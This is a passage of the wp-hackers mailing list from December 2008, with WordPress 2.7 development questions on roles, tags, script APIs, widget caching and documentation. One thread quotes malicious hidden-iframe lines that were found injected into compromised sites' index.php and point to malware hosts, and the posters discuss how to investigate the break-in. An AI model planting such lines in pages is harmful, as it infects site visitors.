subscription).

It could be an anomaly in Thunderbird, but I was wondering if 
something related to the post GUID was changed in 2.7 or permalink 
changes or something else that would have fooled the RSS reader into 
thinking these old posts were new?

Did anyone else see this?

Well, I treat categories like buckets that content goes into, things  
like 'articles', 'announcements', 'media', etc. Something with  
semantic meaning. Tags are more topical and specific like  
'Google','WordPress','open source'. This may or may not work for you,  
but by having the clear distinction, I can put posts in my buckets,  
but then tag them up with specifics that people can browse, via the  
archives, or tag clouds.

In comparison, I treat categories as departments, and in fact include 
several categories in my menu.

While I now see the benefit of limiting posts to a single category, 
numerous posts would qualify for two or more categories. In that case, 
I'll probably create an additional, identical, tag for each category -- 
and then, what the heck, add a tag cloud to assist in navigation.

Is this proper form for WordPress and Google? If so, I'll go ahead with 
the plan.

Well, both categories and tags will group posts, by default, a lot of  
themes treat them practically identical, save for the tag cloud.  
Google will find them all, so that's not so much a problem. The whole  
thread was started around being able to switch out categories in a  
permalink and resolve the same post, which is a canonical url issue.

Another idea is to have a compound category that represents the  
overlaps (i.e. cats, dogs, cats-and-dogs), though this may not be  
quite as optimal, especially since you couldn't get at the single  
categories from the compound ones and vice versa. So do what ever  
makes sense for your content.

Subject: [wp-hackers] wordpress 2.7 roles and capabilities...
Message-ID: <494AD5E3.6000903@instinct.co.nz>

We're making a new plugin and...

When the user installs this plugin a new user Role needs to created 
called "Special Editor".

The new "Special Editor" Role needs to be exactly this same as default 
Editor Role that comes with WordPress - except that the "Special Editor" 
should only be able to edit posts and pages that include some custom 
meta - or have been checked as editable by Special Editors.

These instructions no longer seem to apply for 2.7
http://boren.nu/archives/2005/12/01/whats-new-in-20-roles-and-capabilities/

Can anybody help?

Ciao,

Dan

thank you! didn't see that one in the code or documented anywhere.

the metadata/custom fields don't seem to be passed in-- is that available
anywhere?

just do a var_dump($_POST) inside the filter to see how the custom fields
are passed and use that.

using $_POST is a bad habit & is not adequate, as actions and filters may
add their own custom fields... as is this case here. i'm building on top of
a system that appends hidden custom fields further up the action chain. am i
stuck with waiting for the insert and pulling it back out again?

That isn't GPL, or at least it doesn't specifically say it is.

Making a sitemap is really easy anyway.

I meant making the sitemap itself is easy. Getting a list/array of every

That's why I use SVN working copies to manage my copies of WordPress.

All you have to do is type "svn status", and it'll tell you a list of
all core files you have modified. "svn diff", and it'll tell you exactly
what's changed.

"svn update" (or "svn switch" if you switch to specific releases, or
"tags") will pull the latest code from the SVN server, and if you have
modified any files, it will automatically merge your changes with the
incoming updates.

Easy as meat pie (with Fountain tomato sauce).

People are asking about why even if they remove the classic

<meta name="generator" content="WordPress <?php bloginfo('version');
?>" />

The WP version appears anyway.. i checked the code and i saw it's now
autogenerated during the wp_head() call.

How to remove it? The function ican be override by a 2 lines plugin?
And the what are these lines?

Thanks

To just remove it from the web page:
remove_action('wp_head', 'wp_generator');

To remove it from everything:
add_filter('the_generator', create_function('', 'return "";'));

To remove it from specific places:
add_filter('get_the_generator_TYPE', create_function('', 'return "";'));

Where "TYPE" is one of these: html, xhtml, atom, rss2, rdf, comment, export.

Hi Everyone,

I?m new to the group and this is my first post. ?Hello!? I wanted to get
everyone?s thought on this topic.

I have been waiting for a feature called Widgets Per Page in the core. I
have been using a hack to achieve this for a while now.
http://trac.wordpress.org/ticket/4280 . I have been following this ticket
and it keeps getting pushed back. I posed the question to Matt yesterday on
Wordpress Weekly and he said he did not think it would make it in 2.8
either, though a cool feature. He said the biggest issue was to provide a UI
for it.

Does community think this would be a great feature and if so is there any
way to make a push for a 2.8 release?


Thanks,
John

Hello everybody,

I hope you are in a warm place right now, here in New York it's really 
cold and windy! I have a question: I am working on a website maintained 
by multiple content editors. Each editor should be allowed to publish 
articles in a given category, thus restricting his/her role. I found the 
plugin Role Scoper, but for some unknown reason, it does not work on my 
test environment (Sun Solaris with Sun One Webserver 7 and Coolstack 
PHP). Is there another way to do this? Do you plan to add this feature 
to the core, in the next future?

Thank you and happy holidays!
dino.

I'm not sure about the exact features of Role Scoper regarding
categories, but the other major Capability management plugin is Role
Manager: http://www.im-web-gefunden.de/wordpress-plugins/role-manager/

it might help you on your way.

Thank you Jeremy,

I was taking a look at Role Manager, but I cannot figure out how to use 
it for what I need. As far as I can see there are not "per category" 
restrictions available. I can create new roles, but I don't see how to 
restrict them to a given category.

Thank you,
dino.

yeah. RM doesn't actually add any new roles/capabilities/features to
wp, it just gives you a UI for manipulating the existing system. You
can create new custom *roles* or add specific capabilities to specific
users but you need to code your own systems to implement any custom
*capabilities* you want to run.

Looks like role scoper does a lot more than that, so you'll have to
get that fixed or find another solution to your content delegation
issues.

Agreed. A lot of users don't care about XML sitemaps, I don't see any 
benefit in bloating WP with something most people have no need for.

Another in agreement. I do use Arne's plugin on most of the WP sites I build
but don't want to see the core bloated by a sitemap. The community of users
has not been clamouring for a new sitemap in the core so I cannot see why it
would be included in 2.8, especially as a lot of people don't want or need
it.

Mind you, my comment can be taken with a grain of salt because I still don't
see why the 2.7 core needed to have threaded comments or comment paging
either.

Hi,

I have this friend of mine that has a (WP) blog. Considered (and voted)
the best blog in Portugal.

He's having a problem. He requires users to be registered in the blog
for commenting.

Everything was running well until a 2 days ago, when suddenly people
started logging in to comment at

http://hisblog/wp-login.php?action=login

and they aren't being redirected to their profile page
/wp-admin/profile.php) or the blog's one.
But the fact is that despite this, they get logged, they just aren't
being redirected.

My best guess is that somehow, file wp-login.php isn't "cooperating"
with wp-login.php

He, as the blog's administrator don't have the problem when logging in.

Firefox says they're being redirected in a way it would never complete
or something like that. Internet Explorer justs does nothing.

So, he asked me for help and gave me a login and password that only
works for FTP. Unfortunately, his hosting doesn't allow shell access.

I've downloaded files .htaccess and wp-login.php through FTP and all
seems ok to me.

He's using 2.7

I'm sorry for not providing you with more details, but I myself don't
have them, not even the raw Apache logs.

Does anyone have a clue of what might be happening and a solution ?

Any help would be more than appreciated.

Warm Regards,

Things very rarely happen "suddenly".  Well, they do, but usually 
there's a reason.  Did this happening coincide with a 2.7 upgrade?  If 
so, perhaps the theme needs a refresh for 2.7.

Is he using some kind of plugin to redirect users, as the normal landing 
page would be the dashboard.  If so, that points to plugin issues.

Obvisouly I meant : "My best guess is that somehow, file wp-login.php
isn't "cooperating" with the users table".

It didn't appear with the 2.7 upgrade and he has no new plugin.
I've checked his plugin directory and he has no plugin for redirection
either.

I speculate that the file wp-login.php *in the user's login redirection
part* isn't getting the user's data from de WP DB table and therefore
isn't redirecting.

Because on the other hand, they get logged.

So, my best guess is that the problem lies either on the user's table
structure or in that tiny little piece of code on that file that should
be doing the job.

How exactly should be that code ? The on which does the redirection
after the login ?

M?rio,

I suspect .htaccess and permalinks but we'd have to take a closer look. 
Tell him (or you) to come over to the PT support forum, we might be able 
to help. If he (or you) already did, please point me to the relevant

Come to think of it, it may also have to do with the 2.7 changes to 
wp-config.php, specifically cookies, i.e.:

AUTH_KEY
SECURE_AUTH_KEY
LOGGED_IN_KEY
'NONCE_KEY <-- new, afaik

Refreshing browser, cache and cleaning cookies might help.

Except that I'm not actually using "Default" theme - I coped it and  
renamed it so I could name changes with impunity.

Nonetheless, no dice.  I'm now still getting the bug even when using  
the Default theme and no plugins.  WordPress itself is acting wonky....

Hi,

feel free to use my plugin or parts of it for the core. But actually
it's only a small amount of people who care about the sitemaps. And
the other guys want more features than a basic sitemap like pings,
adjust everything, excludes etc. so it could get bloated quite fast
(just have a look how large the plugin already is...)

Best regards,

  Arne

Subject: [wp-hackers] settings_fields and check_admin_referer
Message-ID: <5fea0420812210957u80647a2l1bd6e1ea6d8bf4cd@mail.gmail.com>

Hi all,

I have a question concerning the usage of the new function seetings_fields.
Following this conversation:
http://comox.textdrive.com/pipermail/wp-hackers/2008-October/022168.html

... I made these changes to my plugin. Off of "admin_init" I am calling this
function to register my settings:
register_setting('feedreading_blogroll_settings_group',
'feedreading_blogroll_settings', 1)

In my option-form, I have the following line:
settings_fields('feedreading_blogroll_settings_group');


Now I wonder in which way I have to add the call of check_admin_referer() to
my plugin? Is this still necessary?

In the past I called this function from within one of my own functions that
was rendering my admin-page. Now it seems, I can't maintain the arguments
for check_admin_referer() I have used in the past.

Now, when I fill out the form and press "save changes" I get redirected to a
page that simply asks "Are you sure you want to do this?". Unfortunately,
the are no buttons supplied where I could click "yes" or "no".

What would be the correct argument for check_admin_referer()? Is there a
template for a WordPress-plugin that uses all the new functions from the
WP2.7-plugin-API?

You can download the plugin here:
http://wordpress.org/extend/plugins/feed-reading-blogroll/. Unfortunately,
the current version contains the bug with the "Are you sure you want to do
this?"-question. D'oh.

Best regards

Message-ID: <df809b110812220927n410b8353ia588041378586a8d@mail.gmail.com>

Hello,

For some reason i found my blog's index.php (not theme's index.php)
with the following piece of code right before the ?>

echo "<iframe src=\"http://thedeadpit.com/?click=17470781\" width=1
height=1 style=\"visibility:hidden;position:absolute\"></iframe>";

I tried looking at the logs. No luck. The file's permisions look like this:

-rw-r--r-- 1 madalin madalin 557 Dec 22 15:50 /home/madalin/www/index.php

I'm still trying to figure out how that line got there. I've
downloaded wordpress right from wordpress.org, and the server is a
dedicated one, only two users with shell access to it.

Any suggestions ?

Well, i had the following plugins that were older: sociable, nextgen
gallery and google-sitemap-generator.

I'm checking the plugin's websites to see if any specify something
like that. If not, i have NO idea how the cracker got in.

Everyone any other suggestions ?

Thanks

Nope. chkrootkit doesnt provide me with no information. Also lsof
|grep LISTEN doesnt show any abnormal ports open.

So, the server looks clean, i've search for every .php file containing
that and the only file that was changed is
/home/madalin/public_html/index.php (which is owned by madalin) so, no
other users have been affected by this...

Thanks.

If the file is writable for the webserver and file access is enabled  
on the webserver: yes.

I have a client I just started working with who had the same problem only
the offending line was this (and it showed up on several files, including
their RSS feed):

<iframe src="http://hosttracker.net/?click=5715531" width=1 height=1
style="visibility:hidden;position:absolute"></iframe>

Not sure what to make of it...

That you know of.

If there are any XSS vulnerabilities in 2.7 they haven't been made
public yet.  Although, any one of the plugins you have installed may
have a vulnerability.

On top of that perhaps either your password or your friends password
has been compromised.

There are thousands of situations as to what may have caused this.

It doesn't seem to be WordPress related, I found one site running phpBB
which also is infected, I don't know Brazilian
(http://www.phpbbrasil.com.br/phpBB/viewtopic.php?f=37&t=21344&p=191869)
but what I gather is that it links to a page with
Trojan-Downloader.JS.Tabletka.a virus.

I'll keep digging :)

Well, wait.  he said:  "i found [it in] my blog's index.php (not  
theme's index.php)"

Does this mean it shows up in the final rendered page, but not in the  
theme's file?  In that case, it's being added dynamically.  The link  
is not written in the theme.

Just trying to clarify.  I'm no security guru... (IANASG)

Yes that's exactly what i am saying. Here is my index.php:

<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require('./wp-blog-header.php');

// echo "<iframe src=\"http://thedeadpit.com/?click=17470781\" width=1
height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>



I've commented the line so i can keep it for future investigations.

Our password have NOT been compromised as the only logins are from my
host and my friend's host. It could be an older version of a plugin
tough.

However, i had to report this as maybe someone will encounter the same
problem or so.

Thanks.

That sux. You started picking through your web logs to see if it came  
through your publicly accessible website? Sometimes you can check  
error and weblogs and look for unusual request strings to determine if  
the exploit came through a vulnerable web application. In some cases  
the intruder will cleanup behind themselves. Unfortunately sometimes  
the exploits don't produce anything log-able.

If they do cleanup, you may notice missing times in log files. At  
least that can give you a time frame if you didn't figure that out  
from the modification stamp on the files.

I didn't notice if you mentioned the server platform. Other WP-Hackers  
may be able to offer some diagnostic tools for your server type.

I am using CENTOS 5.2 x86_64 :)


Thanks.

What's the chance it is some kind of trojan on the developer's machine that
attaches the offending line to source code before it is uploaded?

Just thinking out loud...

Just to chime in on the fun, you're not the only one as a quick google
search pulls a lot of people with similar posts.

http://www.networksolutions.com/whois-search/thedeadpit.com

As well shows the (supposed) owner is in Estonia, which oddly enough
I've seen a lot of failed hack attempts on my site coming from Estonia
(I think, maybe it was algeria?)

Do you have mod_security enabled? No luck on pulling down the
offender's IP, and the site itself seems to do nothing but host a
virus...

Best of luck turning this around...

madalin - 

I'm going to suggest 2 plugins for you to look into using:

WordPress Exploit Scanner (Donncha O Caoimh):
http://wordpress.org/extend/plugins/exploit-scanner/

postlogger for WordPress:
http://www.village-idiot.org/archives/2008/04/16/postlogger-for-wordpress/

I run postlogger, and it's very interesting the things that it logs that 
regular access logs don't. Not saying it would have caught this 
intruder, but you might find other interesting things going on that 
you're not aware of that you can block.

The Exploit Scanner might let you know if there's a vulnerability in a 
plugin or anywhere else in your WordPress install.

Kim

With WP Speedy and my plugin, I'm noticing that not all plugins are 
using the Script and Styles API. This prevents those stylesheets and 
scripts from being minified. I plan on going through the plugins I have 
and "fixing" them, and hopefully the patch is included for the future 
versions.

Why don't more plugin and theme authors use the Scripts and Styles API? 
Is it a documentation issue or is it not high enough of a concern?

This has always been an issue with plugins but, for those who can, its not a
bad idea to always look at the plugin's code before using. The issue with
the API is a bit more complex though - if you are writing a script that is
designed to work with more than just WordPress it often makes sense to
ignore the WP Script/Styles API.

There isn't any supporting evidence to back your argument. I've come to 
the conclusion that I can safely ignore what you've written until said 
criteria has been met.

I think:

<?php
if( function_exists('wp_register_script') )
    wp_register_script();


Might fix your problem or am I wrong? Your use of script is also 
ambiguous in that script could mean JavaScript, in which case your point 
is invalid or it could mean PHP, in which case the above should work fine.

hmmm I've tried using that in the past and end up with so many
wordpress core errors that it was unusable.

Is 2.7 any better?

The point is to show the plugins errors, not WP's :)
So, the same widget would have just as many errors in 2.7 than in
previous versions.

So if I define WP_DEBUG in the plugin it won't show core WP errors? If
thats true then great it becomes usable again.

It'll show any debug errors or warnings that are logged. However, core
shouldn't actually have any, so yes, it should be only plugin errors.

Actually with PHP Speedy javascripts and styles do not need to be 
declared using WP API, only condition for combining is that they are 
placed on the same domain.

I have successfully implemented PHP speedy on my blog (prelovac.com) and 
the biggest problems I had to overcome were:
- php speedy does not pick up normal javascript code (not referenced in 
external files) so problem arises with some plugins when the external 
javascript is combined and moved before this code. I solved this by 
modifying PHP Speedy to reference combined javascript at the end of the page
- php speedy is not compatible with wp super cache out of box so I had 
to modify it

With these two changes you get extremly responsive website and in my 
case a main page with only 8 http requests.

Because it's relatively new and not all plugin authors are good coders.

By the way, what exactly is meant under Scripts and Styles API?
wp_enqueue_script and wp_enqueue_style? Is there anything more? How I can
read about that, if - yes.

And I guess there was somewhere mentioned that one shouldn't use function
starting with wp_, is it still true?

I do not really develop plugins, but I just tried to find a reference to 
Scripts and Styles API in the codex, and I could not.

So maybe I am just not a good example, but if I were to develop a new 
plugin right now, I would not know about this API.

Maybe this would be worth including in wp-config-sample.php, eg.

// Uncomment the following line only for debugging. Not recommended to use
on a live site.
// define('WP_DEBUG', true);

Just a thought. Sometimes reminders can be useful ;)

I guess it has a little bit of black magic as well in the plugin. From 
what I can see, so I may need to actually run the plugin to see what it 
can do. My plugin however, extends the WP_Scripts and WP_Styles classes 
and combines those files, if at all possible. If the capability of WP 
Speedy is so much more, then I must strive to crush it with my own. 
Well, after some more considerable development and testing. Problem is 
that when you combine files, the CSS relative links to images no longer 
work correctly and therefore must be rewritten.

It has never been true that you shouldn't use functions that start with 
wp_. Whoever said that to you was either lying or was or still is a fool.

You can read about the Scripts and Styles API at these locations:

http://trac.wordpress.org/browser/trunk/wp-includes/class.wp-dependencies.php
http://trac.wordpress.org/browser/trunk/wp-includes/functions.wp-styles.php
http://trac.wordpress.org/browser/trunk/wp-includes/functions.wp-scripts.php

Ignore the suggestion to read WP_Scripts::add() and WP_Styles::add(). 
That method is actually part of WP_Dependencies. I suppose an article on 
the Codex might also help it seems.

You'll probably want to enqueue scripts and styles, but you can also 
register them.

I never saw anyone claim that you shouldn't use any functions that begin 
with wp_, but I have seen on the Automattic site where they say that 
coders shouldn't use the widget functions that begin with wp_. I use 
them anyways since there isn't any other way to provide full widget info 
without them.

As for the original question that you had Jacob, I have to say that 
using the API for styles and scripts is not straight-forward at all. At 
first, I didn't use them at all since the hooks you should user aren't 
well documented which resulted in either calling that function too early 
(resulting in errors) or too late (resulting in no css or js inclusions).

After finally figuring out action sequences on my own, I started using 
them more, but then I had other problems. I assumed at first that the 
call somehow /knew/ when to include or not include my css and js (a 
stupid assumption, I know). I would write really nasty code to keep 
track of when the inclusions should or should not be made.

It took me much longer to figure out how to store the resulting page 
name from latching into the menu system and then using that create 
actions for specific page views. Out of everything I've mentioned so 
far, this is by far the most poorly documented of the lot.

So, Jacob, I would have to say that the problems are as follows:

   1. There is a wealth of information on the Codex, but it has three
      fundamental problems:
         1. There is so much information in there, that a new plugin
            developer will either never read specific areas before
            trying to code something or will have forgotten about
            something by the time they need it. This results in them
            finding something that "just works" which they most likely
            will stick with until someone tells them otherwise or they
            randomly stumble on the information.
         2. Despite the fact that there is so much information, I find
            that more often than not, the Codex fails to provide detail
            where detail would be extremely helpful. In addition, I
            often find the examples to be obscure at best and may show
            the specific line of code but none of the surrounding lines
            that are actually needed in order for that section of code
            to make sense and to actually function appropriately.
         3. Most WP developers (myself included), spend very little time
            working on the Codex. Personally, I know that I've only
            contributed significant changes to the get_posts().
   2. Even though WP.org is a community, I find very little community
      involvement when it comes to development in Extend. People put
      plugins and themes on there, some people use it, some people
      don't, and that's the end of it.
   3. There is little perceived benefit to coders to meet the (unknown)
      expectations of other coders.

So, there are the problems, what are the solutions? That is a very tough 
question, but here are some ideas that I have.

    * I think most people will agree that getting more people involved
      in Codex updating would be a good thing, so I think we need to do
      some things to encourage that:
          o A particularly complex function should be selected by a very
            capable coder that knows the Codex and the community well.
            This coder needs to create the ultimate Codex documentation
            page for that function. This page can then become the
            framework which all other pages can be updated/created to
            match. This will provide consistency in information and will
            ensure that contributions are easy to do as little thought
            will need to be given to presentation of the information as
            a guideline is available.
          o After creating this ideal framework for pages, a group of
            Codex "editors" should go through all the Codex and mark
            pages as needing updates in order to match the new
            presentation format. This notice of needing updates should
            include a link to the page that shows the ideal
            presentation. This will help people unfamiliar with this
            discussion know what they need to do without looking elsewhere.
          o Have monthly Codex days. On these days, an announcement will
            come out on this list for coders to "adopt" a Codex page for
            the day. Coders will reply with what page they are adopting,
            so that way other editors know to leave that page alone as
            someone is working on it.
    * I talked with you about this way back at WordCamp Dallas, but it
      still hasn't happened and still needs to be done. The community
      would benefit greatly from a how-to plugin. Basically this plugin
      would essentially do nothing, but it would provide developers a
      best-practice view of how to do specific things. I've been working
      on one on and off for the past few months, but I really need to
      get other people involved. This plugin would be added to Extend so
      as updates come out, developers can always have easy access to the
      latest and greatest examples of how to do specific things (such as
      easily add css and js files).
    * The forums desperately need to be restructured. I am an avid fan
      of forums and over the past few years have spent large quantities
      of time in forums of various topics, but I loath going to the
      WP.org forums. Honestly, I don't know what it is about the forums
      that I dread, but every time I look at them, I feel like I'm
      looking at pea soup. There needs to be a better way to structure
      things in order to make things easy to find. Also, providing
      advanced tool such as showing new topics since last visit, show
      only unanswered posts, subscribe to thread (not just an RSS feed),
      etc can greatly aid those that want to help out as much as
      possible on the forum.
    * Get a better search. The entire site needs a search overhaul.
          o If I want to find the Codex page for the get_posts function,
            I find myself doing the following: searching for get_posts,
            changing to only search documentation and searching again,
            finding that the page I want isn't even on any of the first
            three pages of results, clicking on each of the first
            results while searching for a link to the page I want, and
            then clicking on the get_posts link inside the fourth search
            result. There has to be a better way.
          o I don't think I even need to get started on searching in Extend.
    * The community needs to get more involved with helping people who
      submit content to Extend. In other words, we need to have a sort
      of peer review. Technically, there is nothing limiting us from
      doing this right now, but from what I can tell, it doesn't happen.
      This would go a long way to improving the quality of themes and
      plugins available on Extend as well as go a long way to increase
      the amount of plugins and themes available as coders/designers
      know that there is a helpful community ready to assist them.
    * We need to find ways to get more people involved. I think that the
      Developer Center for Plugins and the More Info for Themes should
      provide people with links to help them get started. In addition,
      it should tell people about the existence of this list, point them
      to the forum, and give them a quick rundown on the Codex. As it
      stands now, it looks like they are on their own, why not
      explicitly show them that there is in fact a community behind all
      of this?

Sorry for the rambling. It seems like I got off-topic, but in reality, 
these issues all trickle down to influence coders' use or disuse of the 
script/style API. I hope that this can be helpful.

Jacob I must have missed something, but you seem to be referencing a 
different plugin from PHP Speedy, possibly your own. Can you send more 
information ?

If you have combined scripts that are correctly using the API that would 
be great. In combination with putting the code to the footer will 
greatly increase the performance ( I released a simple Fotter-javascript 
hack a while ago 
http://www.prelovac.com/vladimir/wordpress-plugins/footer-javascript )

Regarding WP_Styles the main problem that is turning people off from 
using it is that wp_print_styles is still not happening automatically 
(like wp_print_scripts in wp_head) but you need to call it manually 
(this goes from my memory and I think it's still not fixed in 2.7).

Jacob --

If you want people to use these APIs, would you consider writing up a 
Codex article on "Using the Styles and Scripts APIs"?  If I were 
thinking of using these APIs in my plugins, I would need some 
motivation (why do I want to use the APIs as opposed to whatever else 
I would be doing instead, how do they help my plugin), some 
instruction (how do I use the APIs), hopefully an example or two. As 
we've discussed before on Hackers, PHPDoc isn't the same as an article.

Also, apparently this API was only added to Trunk in May of this year. 
Which WP release was it included in? Is the API stable, or will it be 
overhauled in an incompatible way in an upcoming version of WP? I for 
one don't tend to jump on new features of WP (even if I hear about it, 
and this one I hadn't), as they are rarely stable. Someone will change 
how it works, and my plugin won't work any more, or if I use it, my 
plugin will no longer be compatible with the older version of WP some 
of my users are still using because their other plugins don't work 
with the new version of WP.

Anyway, that is my perspective as to why people aren't using it (which 
was the question you asked to start this thread): no how-to doc and 
it's new.

I wouldn't put it in the config sample, since it is just for plugin

to the Writing a Plugin article, though. :)

In 2.7 wp_print_styles is run on wp_head automatically with a priority
of 9.  So you need to hook into wp_head with a priority of 8 to get it
to work.

Subject: [wp-hackers] Using Media Uploader In Plugin
Message-ID: <e9f3ce460812231437s3ace772fnedf2f9f9ecdcdc9e@mail.gmail.com>

Hello all

The Media Uploader in 2.7 now allows for you to upload, among other
things, .zip and MP3 files. As a few of you might remember, I've been
developing on and off a plugin for managing a record label. One
brilliant addition to this would be to allow the user to upload .mp3
or .flac files directly using the plugin and the Wordpress interface.

So how can I hook into the uploader flash thing itself? I want .flac
files to be uploaded, but to not go into the media library, but to be
processed in a slightly different way.

Is this possible? Is there any documentation that will help me through
or any examples of plugins that already implement this kind of thing?

Thanks in advance.

Message-ID: <b4dd281c0812231617t5ac4a5f2v99d6b03def19fd6e@mail.gmail.com>

Hi all:

I'm wondering if there are any best practices for caching output generated
by a plugin widget?

I have written a simple plugin for a client that collects the top 10
categories in descending order based on a count of the number of posts. Of
course it doesn't make sense to run that SQL query for every page load.  I
could generate the list and then write it to a text file somewhere and read
from in instead to cache but I'm wondering if there is not a "standard" way
to cache the output?

Also I could just refresh periodically (hourly?) or maybe hooking when a
post is added/updated and/or a category applied/removed; suggestions on
this?

If the wp install has caching enabled, the widget's output will be  
automatically cached (right?).

Otherwise, if you want to "cache" it regardless of if the install has  
caching enabled, you could use update_option() and get_option(), with  
a small time-based expiry mechanism.

Thanks for the response.

There is caching built into 2.7?  Or are you talking about something like WP
Super Cache?

As for using get_option(), I hadn't thought of that. I wonder if storing big
blocks of text that way isn't inefficient compared to using the file
system?  Or maybe it's a trivial difference?

I like to use the options route because it works no matter what and
its a pretty stable api at this point. When I played with the wp_cache
mechanism in the past I found that various things would stop it from
working (wp-config.php constant? I think that was removed), and it was
pretty confusing. The documentation was also pretty much non-existent
at that point, might be better now.

Its worth noting that the RSS aggregation/fetching system used by the
Dashboard in WP uses the options table to store  full feed content,
implying its not such a bad idea to use it for text blocks. If its
truly humonguous it might be better to avoid the IO to the db, but
since you're already fetching everything from the wp_options table it
won't be a slow/complex query at all, its only the raw size of the
result that could potentially be a problem.

In terms of updating it semi regularly I use a separate option for
each cached value that just has the timestamp of the expiry for that
value, on pageload I autoload all those expirations and update the
option if its the right time. Hooking into the relevant actions
(category update, post save) would also be a good idea if those
actions are likely to make a big difference on performance (I haven't
gotten around to it, and my users are perpetually confused about why
the new category isn't showing etc.)

I have several widgetized sections in a particular theme, and I'm looking
for a way to clear out all the widgets placed into the sections in 1 swoop.
Is there a single line I can place in my functions.php file that will
basically take all the widgets currently placed into widget sections and
remove them?

Figured it out on my own.  Here's what I added:
$null = null;
update_option('sidebars_widgets',$null);

It clears out all active widgets ... gives you a clean slate.

Sorry, I've attempted to write a comprehensive developer manual several 
times, but I've just never had enough motivation. It is really difficult 
to do something like what Automattic is planning with a DocBook type 
User Manual (See Matt Mullenweg interview). I doubt it will include 
developer related topics such as these.

I suppose again the problem when you say that the community should do 
something, is that really they don't have to do anything. That is the 
problem and has always been the problem. Well, inline documentation 
should really be written by the core developers and the ones that submit 
patches. That said, a lot of arguing was made with much ado about 
nothing. Nothing was done for the longest time. Really it took something 
being accomplished first before it really took off.

If you feel strongly about something, I suppose the best advice is to 
bear the cross for as long as possible until someone walks by and gives 
you a hand. Even if the article does exist, there is no telling whether 
anyone will use it. Backwards compatibility is a strong argument, which 
has very weak counters.

Jacob - I'd like to second this.  It took me a few tweaks to pull it
up in google. Thanks for bringing attention to it - I've got a couple
plugins I'd like to tweak to insure I'm following this best practice
(and I'm guity of wp-debug as well, my fault for coding first, reading
docs second).

Message-ID: <4951DB4C.9080707@yahoo.com>

I noticed that my WordPress database backup was excessively large, 
examined it and found it padded with 7,000 lines of WordPress "news."

I'm suspecting the admin panel is the source, as the panel loads all 
sorts of news excerpts.

Any way to prevent WordPress from writing this extra content to my 
database?

I guess you're referring to the rss_* options from the wp_options table,
Personally i'd like to see a better exporter, which can understand what are
user settings, what are defaults, what junk the user doesnt want to backup
(ie. just posts? or revisions and options too? etc)

But No, unless you disable the feeds all together (By adding a blank feed to
the configure/edit widget item thing on the dashboard) the Feeds will be
cached inside WP

Will turing off Showing feeds in WP 2.7 Dashboard will reduce these entries?
Any Idea?

My recommendation(s) would be:

Cache the data in an option.

Don't bother with using the object cache as well the options code will 
be using it anyway.

If your widget is configurable and supports multiple instances ensure that you key your cache based on the config data so that you have a cache entry per widget - something like naming the options mywidget_{md5($config_data)}

Invalidate the cache based on user-actions which require it to be
invalidated - i.e. hook into the relevant actions for post <>
category relationship updates

It is much better to invalidate the cache on a user trigger of change than periodically especially when the data will only change at the point.

I'm not sure if hiding them will stop it, Its loaded regardless AFAIK, just
hidden via Css/Js.

I do believe that you are right Jacob. I've contributed much less than 
I'm capable of contributing as of late, so it's time that I do more.

Here are some projects that I will begin working on more diligently:

    * As mentioned before, I think that having an actively-developed
      how-to plugin would be a very valuable resource for coders. It
      would provide quick access to information on how to use specific
      APIs and will serve as a best practices guide for plugin structure
      and style.
    * I don't believe that I have the best concepts for Codex page
      styling, but I can begin work on a WP function page style
      guideline that can be used to make all the function pages
      consistent while making updates and creation of new pages easier
      and quicker.
    * I propose that we make the third day of each month WordPress Codex
      Day. That day will be as I mentioned before. Essentially people
      send a message on the list that day saying that they are adopting
      a page on the Codex for that day and they will work on improving
      it. If we get enough participation, the Codex can improve
      significantly in a short amount of time.

Unfortunately, I cannot do anything about making the forum better or 
improving the site search, but I would be more than happy to provide 
feedback to people who can make such changes.

Anyone who is interested in helping out with the projects I mentioned or 
has any suggestions, please send me a message.

In the end, I do believe that we can increase participation if we simply 
1) give reminders to people to help coax them into active contributions, 
2) create a system of incentives that can help keep an individual 
contributing, and 3) provide a system that is easy to contribute to 
(with the structure of the forum, the flaky search behavior, and the 
inconsistent structure of the Codex, that is not the current state).

Jeremy;

Thanks for the suggestions.  Sounds like the get_option() really is a great
general purpose caching mechanism.  I think that's what I'll use.

Wait a minute? Feeds? It's sure not my feed dumping unwanted WordPress 
news in my database.

What's the source of this content? And why would the developers so 
callously slop this stuff into users' backups? It serves no useful purpose.

Thanks Peter:

I have two options: bycategory and bytag so I am using (something like)
"mywidget-bycategory" and  "mywidget-bytag."   But I see you are using
md5(); any reason why that would be a benefit?  It would seem to make it
harder for me to look into the database and understand which option is which
(I frequently look in the database during debugging to validate my coding
assumptions.)

>> Invalidate the cache based on user-actions which require it to be

Off hand, do you know which hooks those would be?

Thanks again.

Yes, it is. WordPress caches all the feed items that you see on the
dashboard, if I remember correctly. It's not the feeds that you're
using, but rather those.

Hm... It seems i was wrong, The export functionality only exports the
contents of your posts table, not everything in the database (Which is what
i believe it should be doing, and ignoring the cache options etc.)

How are you backing up? The wordpress export function? A Database Backup
plugin? Something else?

The Export functionality will export all user-content, which means all the
posts, It doesnt do options, it doesnt do links, it doesnt do category
heirachies, it doesnt do tags, it doesnt do link categories, etc.  (It does
export tags and categories attached to a post, but doesnt export an actual
-list- of them)

Exporting your Database from something like PHPMyAdmin or from a Database
Backup plugin will dump -exactly- what is in your database, In there, Its
common for options to store cached data to speed up access(ie. so it doesnt
need to re-fetch the feed from a slow remote server every page load), This
is what i was thinking you were refering to.

If you only have those two options then just having a 
mywidget-bycategory and mywidget-bytag is fine.

The idea behind using md5 is if your widget accepts a lot of config 
options you just md5 the string containing all the options and let that 
handle the matching for you.

edit_post, save_post, wp_insert_post are all hooks that are fired on 
post updates and inserts.

You will need to decide which is the best to use (probably wp_insert_post).

Funnily enough I want something similar, I tried to use the uploader
on a separate page and got... nowhere. I've also tried quite a few
alternatives and they all seem to fail at some point (except one small
flash uploader which i got to work... then found out it would only
upload images).

I'm trying to add an uploader that can upload large files (bigger than
php will normally allow), to a specific directory but I don't
want/need it limited in other ways, as I will ahve no idea what users
will want to upload.

Ah cool, that makes lots of sense. Thanks.

BTW, I had a tough time finding an example that dealt with my simple version
and finally had to just brute force to figure it out. :-)

>> edit_post, save_post, wp_insert_post are all hooks that are fired on post
updates and inserts.

Thanks!

Just as an aside I wanted to say that over the years I've participated on
lots of forums and in lots of email lists and I've got to say that the
